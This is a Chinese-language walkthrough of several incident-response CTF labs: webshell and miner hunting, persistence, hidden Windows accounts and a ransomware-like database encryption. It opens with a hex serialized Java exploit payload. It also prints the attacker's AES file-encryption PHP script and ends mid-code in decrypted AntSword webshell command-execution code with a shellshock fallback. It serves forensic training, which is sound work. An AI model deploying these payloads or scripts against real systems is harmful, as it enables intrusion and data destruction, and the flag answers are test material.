06700000098000f0076001100730074000900aa001100730074000900e4001100730074000901240011007300740009016a001100730074000901940016007300740009000001ab006800690000000001ab007500760001000001ab007700780002000001ab0079007a0003000601a5007b007c0004000c019f007d007e000500150196007f00800006001e018d008100820007004a016100830084000800850000000c0001001e018d0081008600070087000000330007ff0087000907008807008907008a07008b07008c07008d07008e07008f070090000033393ffb0045fc0026070091fa0007006e0000000600020092006f00700000000d03007500000077000000790000000100930064000100650000002b0000000100000001b10000000200660000000600010000005400670000000c00010000000100680069000000010094009500030065000002e50006001200000133b800181219b6001a3a062b121b06bd001c5903121d535904b2001e535905b2001e53b6001f3a07190704b60020013a082c1221b600223a08a700293a0919072c06bd00245903190653590403b800255359051906beb8002553b60026c0001c3a08190804bd001c5903122753b600283a09190904b60029190904bd002459032ab60012b6002a53b6002b3a0a1908122c04bd001c5903121d53b6001f3a0b190b04b6002012023a0c2d122d190cb9002e0300122fb800303a0d190d05bb003159190cb60032122fb70033b60034190dbb003559b700361904b900370100b60038b60039b6003a3a0e190b190a04bd00245903190e53b60026c0001c3a0f190fb6003b3a10190f123c04bd001c5903122453b6001f3a11191104b600201911191004bd00245903190553b6002657a700053a07b1000200300038003b0023000a012d0130003d000400660000006a001a00000057000a005a0027005b002d005c0030005f00380062003b0060003d0061006100640071006500770066008c0067009e006800a4006900a8006a00b2006b00b9006c00cd006d00e8006e00fd006f0104007001160071011c0072012d007401300073013200750067000000c00013003d002400960097000900270106009800990007003000fd009a00740008007100bc009b009c0009008c00a1009d009e000a009e008f009f0099000b00a8008500a00061000c00b9007400a100a2000d00e8004500a300a4000e00fd003000a50074000f0104002900a6009e00100116001700a70099001100000133006800690000000001330073007400010000013300830084000200000133007f0080000300000133007b007c000400000133008100820005000a012900a800a4000600850000000c0001000001330081008600050087000000480004ff003b000907008807009107009007008e07008c07008f07001d0700a907009100010700aa25ff00ce000707008807009107009007008e07008c07008f07001d00010700ab01007000000015050073000000830000007f0000007b00000081000000ac0000000200ad000100ae00af000300650000003f0000000300000001b1000000020066000000060001000000780067000000200003000000010068006900000000000100b000b100010000000100b200b30002006e00000004000100b40070000000090200b0000000b20000000100ae00b500030065000000490000000400000001b10000000200660000000600010000007b00670000002a0004000000010068006900000000000100b000b100010000000100b600b700020000000100b800b90003006e00000004000100b400700000000d0300b0000000b6000000b80000000800ba006400010065000001da0005000a000000de123e4bb8000db6000ec0003f4c2bb60040b900410100c000424d1243b800441245b600464e2d04b600472d2cb60048c000493a041904123eb9004a0200c7009cbb004b59b7004c3a05bb004d59b7004e3a0619061905b6004f1906123eb6005019061905b60012b60014b600512c1906b60052bb005359b700543a0719071255b600561907123eb600571907b20058b60059b6005a2c1907b6005b125c05bd001c5903125d535904124d53b600283a08190804b60029190805bd002459032c535904190653b6002bc0005c3a091904123e1909b9000a030057a700044bb10001000000d900dc003d000300660000006600190000007f00030080000d0081001a008200250083002a008400340085004000860049008700520088005900890060008a006d008b0073008c007c008d0083008e008a008f00950090009b009100b0009200b6009300cd009400d9009700dc009600dd0099006700000066000a0049009000bb00bc00050052008700bd00be0006007c005d00bf00c0000700b00029009b009c000800cd000c006c00c10009000300d600c200610000000d00cc00c300c40001001a00bf00c500c60002002500b400c700c80003003400a500c90082000400870000000a0003fb00d9420700ab00000200ca0000000200cb01470000000a000100e500e201460009707400013170770100787372002e6a617661782e6d616e6167656d656e742e42616441747472696275746556616c7565457870457863657074696f6ed4e7daab632d46400200014c000376616c7400124c6a6176612f6c616e672f4f626a6563743b787200136a6176612e6c616e672e457863657074696f6ed0fd1f3e1a3b1cc4020000787200136a6176612e6c616e672e5468726f7761626c65d5c635273977b8cb0300044c000563617573657400154c6a6176612f6c616e672f5468726f7761626c653b4c000d64657461696c4d65737361676571007e00055b000a737461636b547261636574001e5b4c6a6176612f6c616e672f537461636b5472616365456c656d656e743b4c001473757070726573736564457863657074696f6e737400104c6a6176612f7574696c2f4c6973743b787071007e0014707572001e5b4c6a6176612e6c616e672e537461636b5472616365456c656d656e743b02462a3c3cfd22390200007870000000027372001b6a6176612e6c616e672e537461636b5472616365456c656d656e746109c59a2636dd8502000449000a6c696e654e756d6265724c000e6465636c6172696e67436c61737371007e00054c000866696c654e616d6571007e00054c000a6d6574686f644e616d6571007e000578700000002774000454657374740009546573742e6a61766174000367656e7371007e00170000000f71007e001971007e001a7400046d61696e737200266a6176612e7574696c2e436f6c6c656374696f6e7324556e6d6f6469666961626c654c697374fc0f2531b5ec8e100200014c00046c69737471007e00137872002c6a6176612e7574696c2e436f6c6c656374696f6e7324556e6d6f6469666961626c65436f6c6c656374696f6e19420080cb5ef71e0200014c0001637400164c6a6176612f7574696c2f436f6c6c656374696f6e3b7870737200136a6176612e7574696c2e41727261794c6973747881d21d99c7619d03000149000473697a657870000000007704000000007871007e0023787372001e636f6d2e616c69626162612e666173746a736f6e2e4a534f4e417272617900000000000000010200014c00046c69737471007e001378707371007e00220000000177040000000171007e00077878;",
    }
}
```

密码为

```
goautomne
```
![](../_Attachment/玄机应急响应wp(先知).assets/image-20240710163539037.png)

直接rce即可
![](../_Attachment/玄机应急响应wp(先知).assets/image-20240710163552560.png)

```
flag{Debian 4.19.260-1 (2022-09-29) x86_64 GNU/Linux}
```

# 第九章-blueteam 的小心思

```
tar -czvf web.tar.gz ./* 
tar -czvf log.tar.gz ./*
```

攻击者通过什么密码成功登录了网站的后台？提交密码字符串的小写md5值，格式flag{md5}。

```
SHOW TABLES;
select * from cpg16x_users;
```
![](../_Attachment/玄机应急响应wp(先知).assets/image-20240710163604405.png)

```
Urjtj7rqJOpNaa0wloFl8pbHBxr+5zgx
LCzEOq/2eTBcg+/iityPEOSkFETwLlSQ
```

后面暂时解不出来，猜测有流量

```
find / -name *.pcap 2>/dev/null
```
![](../_Attachment/玄机应急响应wp(先知).assets/image-20240710163611948.png)

![](../_Attachment/玄机应急响应wp(先知).assets/image-20240710163614543.png)

找最后一个login的

```
Aa12345^
d63edb0e9df4cf411398e3658c0237e0
flag{d63edb0e9df4cf411398e3658c0237e0}
```

攻击者在哪个PHP页面中成功上传了后门文件？例如upload.php页面，上传字符串"upload.php"的小写md5值，格式flag{md5}。
查找一下boundary，文件上传有的关键词
![](../_Attachment/玄机应急响应wp(先知).assets/image-20240710163623039.png)

```
pluginmgr.php
flag{b05c0be368ffa72e6cb2df7e1e1b27be}
```

找到攻击者上传的webshell文件，提交该文件的小写md5值，格式flag{md5}。
可以看d盾，也可以直接看流量
![](../_Attachment/玄机应急响应wp(先知).assets/image-20240710163631241.png)

![](../_Attachment/玄机应急响应wp(先知).assets/image-20240710163634949.png)

```
flag{a097b773ced57bb7d51c6719fe8fe5f5}
```

攻击者后续又下载了一个可执行的后门程序，提交该文件的小写md5值，格式flag{md5}。

```
find / -newerct '2024-01-24 08:10:00' ! -newerct '2024-01-24 09:10:00' ! -path '/proc/*' ! -path /'sys/*' ! -path '/run/*' -type f -exec ls -lctr --full-time {} \+ 2>/dev/null
```
![](../_Attachment/玄机应急响应wp(先知).assets/image-20240710163657283.png)

![](../_Attachment/玄机应急响应wp(先知).assets/image-20240710163700557.png)

找到一个可疑文件
![](../_Attachment/玄机应急响应wp(先知).assets/image-20240710163705816.png)

```
flag{ee279c39bf3dcb225093bdbafeb9a439}
```

攻击者创建了后门用户的名称是？例如attack恶意用户，上传字符串"attack"的小写md5值，格式flag{md5}。
![](../_Attachment/玄机应急响应wp(先知).assets/image-20240710163717353.png)

```
knowledgegraphd
flag{4cda3461543c9a770a3349760594facd}
```

攻击者创建了一个持久化的配置项，导致任意用户登录就会触发后门的连接。提交该配置项对应配置文件的小写md5值，格式flag{md5}。
一般这种配置在/etc，猜测是执行可执行文件

```
grep -Er "is.world" /etc
```
![](../_Attachment/玄机应急响应wp(先知).assets/image-20240710163726904.png)

![](../_Attachment/玄机应急响应wp(先知).assets/image-20240710163730093.png)

```
/etc/profile
flag{65bf3e4a9ac90d75ec28be0317775618}
```

攻击者创建了一个持久化的配置项，导致只有root用户登录才会触发后门的连接。提交该配置项对应配置文件的小写md5值，格式flag{md5}。
![](../_Attachment/玄机应急响应wp(先知).assets/image-20240710163739395.png)

![](../_Attachment/玄机应急响应wp(先知).assets/image-20240710163742414.png)

```
/root/.bashrc
flag{4acc9c465eeeb139c194893ec0a8bcbc}
```

攻击者加密了哪个数据库？提交数据库的文件夹名，例如user数据库对应存放位置为user文件夹，上传字符串"user"的小写md5值，格式flag{md5}。
查看数据库存储的地方

```
/var/lib/mysql
```
![](../_Attachment/玄机应急响应wp(先知).assets/image-20240710163752729.png)

```
root/mysql123
```

连接一下数据库
![](../_Attachment/玄机应急响应wp(先知).assets/image-20240710163802427.png)

就JPMorgan@0020Chase打不开

```
JPMorgan@0020Chase
flag{0928a5424aa6126e5923980ca103560e}
```

解密数据库，提交Harper用户对应Areer的值。提交Areer值的小写md5值，格式flag{md5}。
![](../_Attachment/玄机应急响应wp(先知).assets/image-20240710163812576.png)

```
find / -type f -newer /var/www/html/plugins/cpg.php  ! -newer Balance.frm 2>/dev/null
```
![](../_Attachment/玄机应急响应wp(先知).assets/image-20240710163820132.png)

![](../_Attachment/玄机应急响应wp(先知).assets/image-20240710163823230.png)

看到一个php

```
/var/lib/mysql/clockup.php
<?php
$currentDate = date("Y-m-d");
$key = md5($currentDate);
$iv = substr(hash('sha256', "DeepMountainsGD"), 0, 16);
$filePath = "/var/lib/mysql/JPMorgan@0020Chase";
$files = scandir($filePath);
foreach ($files as $file) {
    if ($file != "." && $file != "..") {
        $fullPath = $filePath . '/' . $file;
        $content = file_get_contents($fullPath);
        $encryptedContent = openssl_encrypt($content, 'aes-256-cbc', $key, 0, $iv);
        file_put_contents($fullPath, $encryptedContent);
    }
}
?>
```

根据逻辑反推

```
<?php


$key = md5("2023-11-18");
$iv = substr(hash('sha256', "DeepMountainsGD"), 0, 16);
$content = file_get_contents("UserIdentitybak.ibd");
$data = openssl_decrypt($content,"aes-256-cbc",$key,0,$iv);

file_put_contents("UserIdentity.ibd",$data);
```

要确定自己的php含有openssl，还原好的四个文件替换原来的,然后mysql查询就行
![](../_Attachment/玄机应急响应wp(先知).assets/image-20240710163837139.png)

```
Chef
flag{8fd82b8864d71ed7fa12b59e6e34cd1c}
```

因为什么文件中的漏洞配置，导致了攻击者成功执行命令并提权。提交该文件的小写md5值，格式flag{md5}。

```
find / -user root -perm -4000 -print 2>/dev/null
```

盲猜一手sudo提权,直接看/etc/sudoers

```
flag{8fd82b8864d71ed7fa12b59e6e34cd1c}
```

# 第九章-NOP Team dmz-A

启动

```
/opt/zbox/zbox -ap 8081 && /opt/zbox/zbox start
tar -czvf web.tar.gz ./*
```

1、请提交禅道的版本号，格式: flag{xx.xxx.xxxx}
![](../_Attachment/玄机应急响应wp(先知).assets/image-20240710163855319.png)

翻一下web目录可以找到

```
flag{18.0.beta1}
```

2、分析攻击者使用了什么工具对内网环境进行了信息收集，将该工具名称提交 flag{xxxx}
![](../_Attachment/玄机应急响应wp(先知).assets/image-20240710163902946.png)

```
flag{fscan}
```

3、攻击者攻击服务器得到shell以后，是处于哪个用户下做的操作，将该用户名提交 flag{xxxx}
版本是18.0.beta1，有个rce洞，应该是打这个
[禅道项目管理系统RCE漏洞复现+利用_禅道漏洞-CSDN博客](https://blog.csdn.net/qq_41904294/article/details/128838423)
搜

```
SCM=Subversion
```
![](../_Attachment/玄机应急响应wp(先知).assets/image-20240710163917865.png)

4、攻击者扫描到内网 DMZ-B机器的账户密码为多少格式 flag{root:root}
直接cat fscan的扫描结果

```
flag{admin:123456}
```

# 第九章-NOP Team dmz-B
![](../_Attachment/玄机应急响应wp(先知).assets/image-20240710164000111.png)

上一题拿到的是

admin:123456
直接看一下history，发现连接过C主机
![](../_Attachment/玄机应急响应wp(先知).assets/image-20240710164007974.png)

flag{ssh:deploy}
![](../_Attachment/玄机应急响应wp(先知).assets/image-20240710164014813.png)

把私钥拿下来
![](../_Attachment/玄机应急响应wp(先知).assets/image-20240710164020764.png)

# 第九章-NOP Team dmz-C

1、攻击者通过攻击DMZ-B机器发现有密钥可以免密登录到DMZ-C机器里，然后攻击者上传了一个挖矿程序，请将该挖矿程序的名称提交，格式 <flag{xxxxxx}>
看一下history
![](../_Attachment/玄机应急响应wp(先知).assets/image-20240710164030878.png)

```
flag{xmrig}
```

2、攻击者通过攻击DMZ-B机器发现有密钥可以免密登录到DMZ-C机器里，然后攻击者上传了一个挖矿程序，请将该挖矿的地址提交，格式 <flag{xxxxxx}>
看一下config
![](../_Attachment/玄机应急响应wp(先知).assets/image-20240710164040432.png)

```
flag{xmrs1.pool.cn.com:55503}
```

3、攻击者通过攻击DMZ-B机器发现有密钥可以免密登录到DMZ-C机器里，然后攻击者上传了一个挖矿程序，但由于DMZ-C机器是不出网的，所以攻击者通过了一种方式将流量转发了出去，请将转发的目标端口提交，格式 <flag{xxxxxx}>
盲猜代理，看到这里有frp
![](../_Attachment/玄机应急响应wp(先知).assets/image-20240710164047100.png)

```
flag{1080}
```

4、攻击者通过攻击DMZ-B机器发现有密钥可以免密登录到DMZ-C机器里，然后攻击者上传了一个挖矿程序，但由于DMZ-C机器是不出网的，所以攻击者通过了一种方式将流量转发了出去，请将用来做转发的工具的名称提交，格式 <flag{xxxxxx}>

```
flag{frpc}
```

5、攻击者最后通过某配置文件配置错误，从而直接可以拥有root用户权限，请将错误配置的那一行等于号后面的内容(不含空格)提交，格式 <flag{xxxxxxx}>
sudo就可以有root权限，配置文件为/etc/sudoers

```
sudo cat /etc/sudoers
```
![](../_Attachment/玄机应急响应wp(先知).assets/image-20240710164056335.png)

```
(ALL:ALL)NOPASSWD:ALL
```

# 第九章-algo挖矿

通过本地 PC SSH到服务器并且分析黑客的 IP 为多少,将黑客 IP 作为 FLAG 提交;

```
tar -czvf log.tar.gz ./*
```

看auth.log.1
![](../_Attachment/玄机应急响应wp(先知).assets/image-20240710164105847.png)

通过本地 PC SSH到服务器并且分析黑客挖矿程序反链 IP 为多少,将黑客挖矿程序反链的 IP 作为 FLAG 提交;
看到定时任务有个dhpcd，运行一下
![](../_Attachment/玄机应急响应wp(先知).assets/image-20240710164112713.png)

```
root@ip-10-0-10-1:/var/log# /usr/bin/dhpcd
lsof /usr/bin/dhpcd
netstat -tunlap | grep 9923
```

![](../_Attachment/玄机应急响应wp(先知).assets/image-20240710164130827.png)


感觉答案是

```
flag{141.94.96.71}
```

可能是矿池地址变了，但flag没改，下面这个是flag的，

```
flag{139.99.125.38}
```

通过本地 PC SSH到服务器并且分析黑客权限维持文件的md5,将文件的 MD5(md5sum /file) 作为 FLAG 提交;
这个看的是定时任务

```
/var/spool/cron/crontabs/root
```
![](../_Attachment/玄机应急响应wp(先知).assets/image-20240710164136666.png)

7b9a3a8a9e47e5c9675278420e6e7fa0
通过本地 PC SSH到服务器并且分析黑客的用户名为什么,将黑客的用户名作为 FLAG 提交;![](../_Attachment/玄机应急响应wp(先知).assets/image-20240710164146839.png)

```
flag{otto}
```

# 第九章-kswapd0挖矿

通过本地 PC SSH到服务器并且分析黑客的 IP 为多少,将黑客 IP 作为 FLAG 提交;
看auth.log.1
这里有多条登录拒绝记录，猜测是爆破失败
![](../_Attachment/玄机应急响应wp(先知).assets/image-20240710164158860.png)

```
flag{183.164.3.252}
```

通过本地 PC SSH到服务器并且分析黑客的用户名为什么,将黑客的用户名作为 FLAG 提交;
猜测是不是留后门了，然后直接看私钥

![](../_Attachment/玄机应急响应wp(先知).assets/image-20240710164216136.png)



```
flag{mdrfckr}
```

通过本地 PC SSH到服务器并且分析黑客权限维持文件的md5,将文件的 MD5(md5sum /file) 作为 FLAG 提交;

```
/var/spool/cron/crontabs/root
```
![](../_Attachment/玄机应急响应wp(先知).assets/image-20240710164218903.png)

```
flag{45437b4e86fba2ab890ac81db2ec3606}
```

# 第九章-Where-1S-tHe-Hacker

通过本地 PC RDP到服务器并且找到黑客ID 为多少,将黑客ID 作为 FLAG 提交;
打开phpstudy，看看网页
![](../_Attachment/玄机应急响应wp(先知).assets/image-20240710164228204.png)


id写在主页上了

```
flag{X123567X}
```

通过本地 PC RDP到服务器并且找到黑客在什么时间修改了网站主页,将黑客修改了网站主页的时间 作为 FLAG 提交（y-m-d-4:22:33）;
![](../_Attachment/玄机应急响应wp(先知).assets/image-20240710164237573.png)

稍微比对一下，可以看到是改了index.php
![](../_Attachment/玄机应急响应wp(先知).assets/image-20240710164247283.png)

![](../_Attachment/玄机应急响应wp(先知).assets/image-20240710164250907.png)

这里有隐藏字符

```
flag{2023‎-‎11‎-6‎-‏‎4:55:13}
```

通过本地 PC RDP到服务器并且找到黑客第一个webshell文件名是,将第一个webshell文件名 作为FLAG 提交;
![](../_Attachment/玄机应急响应wp(先知).assets/image-20240710164300586.png)

![](../_Attachment/玄机应急响应wp(先知).assets/image-20240710164303838.png)

```
flag{SystemConfig.php}
```

通过本地 PC RDP到服务器并且找到黑客第二个webshell文件名是,将第二个webshell文件名 作为FLAG 提交;
看上图

```
flag{syscon.php}
```

通过本地 PC RDP到服务器并且找到黑客第二个webshell的连接密码是,将第二个webshell的连接密码 作为FLAG 提交;
直接打开syscon.php看一下
![](../_Attachment/玄机应急响应wp(先知).assets/image-20240710164319042.png)

```
flag{pass}
```

通过本地 PC RDP到服务器并且找到黑客新建的隐藏账户,将新建的隐藏账户名字 作为FLAG 提交;
粘贴个pchunter过去
[彻底关闭win10自带杀毒(Windows Defender防病毒)](https://zhuanlan.zhihu.com/p/430289825)
![](https://xzfile.aliyuncs.com/media/upload/picture/20240406173720-43894f1a-f3f9-1.png
看到一个隐藏用户

```
flag{admin$}
```

通过本地 PC RDP到服务器并且找到黑客隐藏账户创建时间是,将隐藏账户创建时间是 作为FLAG 提交（答案格式：2024/12/3 9:16:23）;

```
net user admin$
```
![](../_Attachment/玄机应急响应wp(先知).assets/image-20240710164328616.png)

```
flag{2023/11/6 4:45:34}
```

通过本地 PC RDP到服务器并且找到黑客添加隐藏账户进管理员组的时间,将添加隐藏账户进管理员组的时间 作为FLAG 提交（答案格式：2024/12/3 9:16:23）;
win+r 输入eventvwr看日志，筛选一下时间
![](../_Attachment/玄机应急响应wp(先知).assets/image-20240710164339004.png)

常见事件id

```
4624 登录成功
4625 登录失败，如果有人尝试破解系统密码，可以看到大量连续登录失败信息
4726 删除用户
4722 账号启用
4725 账号禁用
4723 修改密码
4724 重置密码
4634 注销成功
4647 用户启动的注销
4672 管理员登录
4720 创建用户，使用系统漏洞攻击成功后，往往会创建一个用户，方便远程登录
4732 加入安全组，常见于将新用户加入管理员组
4733 移除出安全组
4684 通过登陆界面登陆的
```
![](../_Attachment/玄机应急响应wp(先知).assets/image-20240710164349077.png)

筛选一下4732
![](../_Attachment/玄机应急响应wp(先知).assets/image-20240710164353662.png)

```
flag{2023/11/6 4:46:07}
```

通过本地 PC RDP到服务器并且找到黑客在什么时间从文件中读取保留的密钥,将读取保留的密钥的时间 作为FLAG 提交（答案格式：2024/12/3 9:16:23）;
读取保留密钥的事件id为5058
![](../_Attachment/玄机应急响应wp(先知).assets/image-20240710164404435.png)

```
flag{2023/11/6 4:46:58}
```

通过本地 PC RDP到服务器并且找到黑客通过隐藏账户通过(PTH)哈希传递攻击登录的时间是,将(PTH)哈希传递攻击登录的时间 作为FLAG 提交;
![](../_Attachment/玄机应急响应wp(先知).assets/image-20240710164412715.png)

```
flag{2023/11/6 4:47:28}
```

通过本地 PC RDP到服务器并且找到黑客上传的两个CobaltStrike木马文件名,将上传的两个CobaltStrike木马文件名 作为FLAG 提交（答案格式："A.exe,B.exe"）;
![](../_Attachment/玄机应急响应wp(先知).assets/image-20240710164423351.png)

在病毒和威胁保护里面有

```
flag{SystemTemp.exe,SysnomT.exe}
```

# **第九章-blueteam 的小心思3**

1. 审计日志，攻击者下载恶意木马文件的 ip是多少 flag{ip}

```
flag{192.168.150.253}
```

1. 审计流量包，木马文件连接密码是什么? flag{xxx}
![](../_Attachment/玄机应急响应wp(先知).assets/image-20240710164445030.png)

```
flag{cmd}
```

1. 审计流量包，攻击者反弹的IP和端口是什么? flag{ip:port}
   写个脚本解密一下蚁剑流量

```
流量编号: 50962
解密数据：
i_set("display_errors", "0");@set_time_limit(0);$opdir=@ini_get("open_basedir");if($opdir) {$ocwd=dirname($_SERVER["SCRIPT_FILENAME"]);$oparr=preg_split(base64_decode("Lzt8Oi8="),$opdir);@array_push($oparr,$ocwd,sys_get_temp_dir());foreach($oparr as $item) {if(!@is_writable($item)){continue;};$tmdir=$item."/.db70736";@mkdir($tmdir);if(!@file_exists($tmdir)){continue;}$tmdir=realpath($tmdir);@chdir($tmdir);@ini_set("open_basedir", "..");$cntarr=@preg_split("/\\\\|\//",$tmdir);for($i=0;$i<sizeof($cntarr);$i++){@chdir("..");};@ini_set("open_basedir","/");@rmdir($tmdir);break;};};;function asenc($out){return $out;};function asoutput(){$output=ob_get_contents();ob_end_clean();echo "f57f16"."820073";echo @asenc($output);echo "7d8b2c"."f332af";}ob_start();try{$D=dirname($_SERVER["SCRIPT_FILENAME"]);if($D=="")$D=dirname($_SERVER["PATH_TRANSLATED"]);$R="{$D}   ";if(substr($D,0,1)!="/"){foreach(range("C","Z")as $L)if(is_dir("{$L}:"))$R.="{$L}:";}else{$R.="/";}$R.="   ";$u=(function_exists("posix_getegid"))?@posix_getpwuid(@posix_geteuid()):"";$s=($u)?$u["name"]:@get_current_user();$R.=php_uname();$R.="   {$s}";echo $R;;}catch(Exception $e){echo "ERROR://".$e->getMessage();};asoutput();die();

流量编号: 50986
解密数据：
i_set("display_errors", "0");@set_time_limit(0);$opdir=@ini_get("open_basedir");if($opdir) {$ocwd=dirname($_SERVER["SCRIPT_FILENAME"]);$oparr=preg_split(base64_decode("Lzt8Oi8="),$opdir);@array_push($oparr,$ocwd,sys_get_temp_dir());foreach($oparr as $item) {if(!@is_writable($item)){continue;};$tmdir=$item."/.fe88cf91";@mkdir($tmdir);if(!@file_exists($tmdir)){continue;}$tmdir=realpath($tmdir);@chdir($tmdir);@ini_set("open_basedir", "..");$cntarr=@preg_split("/\\\\|\//",$tmdir);for($i=0;$i<sizeof($cntarr);$i++){@chdir("..");};@ini_set("open_basedir","/");@rmdir($tmdir);break;};};;function asenc($out){return $out;};function asoutput(){$output=ob_get_contents();ob_end_clean();echo "1c0"."1b5d";echo @asenc($output);echo "7f7ae"."a49b8";}ob_start();try{$D=dirname($_SERVER["SCRIPT_FILENAME"]);if($D=="")$D=dirname($_SERVER["PATH_TRANSLATED"]);$R="{$D} ";if(substr($D,0,1)!="/"){foreach(range("C","Z")as $L)if(is_dir("{$L}:"))$R.="{$L}:";}else{$R.="/";}$R.="   ";$u=(function_exists("posix_getegid"))?@posix_getpwuid(@posix_geteuid()):"";$s=($u)?$u["name"]:@get_current_user();$R.=php_uname();$R.="   {$s}";echo $R;;}catch(Exception $e){echo "ERROR://".$e->getMessage();};asoutput();die();

流量编号: 51168
解密数据：
i_set("display_errors", "0");@set_time_limit(0);$opdir=@ini_get("open_basedir");if($opdir) {$ocwd=dirname($_SERVER["SCRIPT_FILENAME"]);$oparr=preg_split(base64_decode("Lzt8Oi8="),$opdir);@array_push($oparr,$ocwd,sys_get_temp_dir());foreach($oparr as $item) {if(!@is_writable($item)){continue;};$tmdir=$item."/.888707f";@mkdir($tmdir);if(!@file_exists($tmdir)){continue;}$tmdir=realpath($tmdir);@chdir($tmdir);@ini_set("open_basedir", "..");$cntarr=@preg_split("/\\\\|\//",$tmdir);for($i=0;$i<sizeof($cntarr);$i++){@chdir("..");};@ini_set("open_basedir","/");@rmdir($tmdir);break;};};;function asenc($out){return $out;};function asoutput(){$output=ob_get_contents();ob_end_clean();echo "84a2"."1dee6";echo @asenc($output);echo "a50"."dc5";}ob_start();try{$p=base64_decode(substr($_POST["s8e70313b6fdd9"],2));$s=base64_decode(substr($_POST["s59b550e33ea1f"],2));$envstr=@base64_decode(substr($_POST["fc745b55a723ae"],2));$d=dirname($_SERVER["SCRIPT_FILENAME"]);$c=substr($d,0,1)=="/"?"-c \"{$s}\"":"/c \"{$s}\"";if(substr($d,0,1)=="/"){@putenv("PATH=".getenv("PATH").":/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin");}else{@putenv("PATH=".getenv("PATH").";C:/Windows/system32;C:/Windows/SysWOW64;C:/Windows;C:/Windows/System32/WindowsPowerShell/v1.0/;");}if(!empty($envstr)){$envarr=explode("|||asline|||", $envstr);foreach($envarr as $v) {if (!empty($v)) {@putenv(str_replace("|||askey|||", "=", $v));}}}$r="{$p} {$c}";function fe($f){$d=explode(",",@ini_get("disable_functions"));if(empty($d)){$d=array();}else{$d=array_map('trim',array_map('strtolower',$d));}return(function_exists($f)&&is_callable($f)&&!in_array($f,$d));};function runshellshock($d, $c) {if (substr($d, 0, 1) == "/" && fe('putenv') && (fe('error_log') || fe('mail'))) {if (strstr(readlink("/bin/sh"), "bash") != FALSE) {$tmp = tempnam(sys_get_temp_dir(), 'as');putenv("PHP_LOL=() { x; }; $c >$tmp 2>&1");if (fe('error_log')) {error_log("a", 1);} else {mail("a@127.0.0.1", "", "", "-bv");}} else {return False;}$output = @file_get_contents($tmp);@unlink($tmp);if ($output != "") {print($output);return True;}}return False;};function runcmd($c){$ret=0;$d=dirname($_SERVER["SCRIPT_FILENAME"]);if(fe('system')){@system($c,$ret);}elseif(fe('passthru')){@passthru($c,$ret);}elseif(fe('shell_exec')){print(@shell_exec($c));}elseif(fe('exec')){@exec($c,$o,$ret);print(join("
",$o));}elseif(fe('popen')){$fp=@popen($c,'r');while(!@feof($fp)){print(@fgets($fp,2048));}@pclose($fp);}elseif(fe('proc_open')){$p = @proc_open($c, array(1 => array('pipe', 'w'), 2 => array('pipe', 'w')), $io);while(!@feof($io[1])){print(@fgets($io[1],2048));}while(!@feof($io[2])){print(@fgets($io[2],2048));}@fclose($io[1]);@fclose($io[2]);@proc_close($p);}elseif(fe('antsystem')){@antsystem($c);}elseif(runshellshock($d, $c)) {return $ret;}elseif(substr($d,0,1)!="/" && @class_exists("COM")){$w=new COM('WScript.shell');$e=$w->exec($c);$so=$e->StdOut();$ret.=$so->ReadAll();$se=$e->StdErr();$ret.=$se->ReadAll();print($ret);}else{$ret = 127;}return $ret;};$ret=@runcmd($r." 2>&1");print ($ret!=0)?"ret={$ret}":"";;}catch(Exception $e){echo "ERROR://".$e->getMessage();};asoutput();die();

流量编号: 51168
解密数据：
cd "/var/www/html/secret";cd /;echo 0ca0765e;pwd;echo 36a714

流量编号: 51168
解密数据：
/bin/sh

流量编号: 51178
解密数据：
cd "/";ls;echo 0ca0765e;pwd;echo 36a714

流量编号: 51178
解密数据：
/bin/sh

流量编号: 51178
解密数据：
i_set("display_errors", "0");@set_time_limit(0);$opdir=@ini_get("open_basedir");if($opdir) {$ocwd=dirname($_SERVER["SCRIPT_FILENAME"]);$oparr=preg_split(base64_decode("Lzt8Oi8="),$opdir);@array_push($oparr,$ocwd,sys_get_temp_dir());foreach($oparr as $item) {if(!@is_writable($item)){continue;};$tmdir=$item."/.66319ebe";@mkdir($tmdir);if(!@file_exists($tmdir)){continue;}$tmdir=realpath($tmdir);@chdir($tmdir);@ini_set("open_basedir", "..");$cntarr=@preg_split("/\\\\|\//",$tmdir);for($i=0;$i<sizeof($cntarr);$i++){@chdir("..");};@ini_set("open_basedir","/");@rmdir($tmdir);break;};};;function asenc($out){return $out;};function asoutput(){$output=ob_get_contents();ob_end_clean();echo "ec4"."6fa6";echo @asenc($output);echo "e7dd8f"."0a83ba";}ob_start();try{$p=base64_decode(substr($_POST["s8e70313b6fdd9"],2));$s=base64_decode(substr($_POST["s59b550e33ea1f"],2));$envstr=@base64_decode(substr($_POST["fc745b55a723ae"],2));$d=dirname($_SERVER["SCRIPT_FILENAME"]);$c=substr($d,0,1)=="/"?"-c \"{$s}\"":"/c \"{$s}\"";if(substr($d,0,1)=="/"){@putenv("PATH=".getenv("PATH").":/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin");}else{@putenv("PATH=".getenv("PATH").";C:/Windows/system32;C:/Windows/SysWOW64;C:/Windows;C:/Windows/System32/WindowsPowerShell/v1.0/;");}if(!empty($envstr)){$envarr=explode("|||asline|||", $envstr);foreach($envarr as $v) {if (!empty($v)) {@putenv(str_replace("|||askey|||", "=", $v));}}}$r="{$p} {$c}";function fe($f){$d=explode(",",@ini_get("disable_functions"));if(empty($d)){$d=array();}else{$d=array_map('trim',array_map('strtolower',$d));}return(function_exists($f)&&is_callable($f)&&!in_array($f,$d));};function runshellshock($d, $c) {if (substr($d, 0, 1) == "/" && fe('putenv') && (fe('error_log') || fe('mail'))) {if (strstr(readlink("/bin/sh"), "bash") != FALSE) {$tmp = tempnam(sys_get_temp_dir(), 'as');putenv("PHP_LOL=() { x; }; $c >$tmp 2>&1");if (fe('error_log')) {error_log("a", 1);} else {mail("a@127.0.0.1", "", "", "-bv");}} else {return False;}$output = @file_get_contents($tmp);@unlink($tmp);if ($output != "") {print($output);return True;}}return False;};function runcmd($c){$ret=0;$d=dirname($_SERVER["SCRIPT_FILENAME"]);if(fe('system')){@system($c,$ret);}elseif(fe('passthru')){@passthru($c,$ret);}elseif(fe('shell_exec')){print(@shell_exec($c));}elseif(fe('exec')){@exec($c,$o,$ret);print(join("
